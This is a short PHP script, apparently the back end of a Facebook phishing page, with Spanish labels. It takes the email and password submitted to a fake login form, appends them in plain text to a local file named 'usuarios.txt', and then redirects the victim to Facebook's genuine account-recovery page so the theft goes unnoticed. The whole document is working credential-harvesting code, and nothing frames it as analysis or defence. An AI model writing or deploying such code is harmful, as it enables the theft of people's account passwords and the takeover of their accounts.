<?php

file_put_contents("usuarios.txt", "Usuario de Facebook: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>
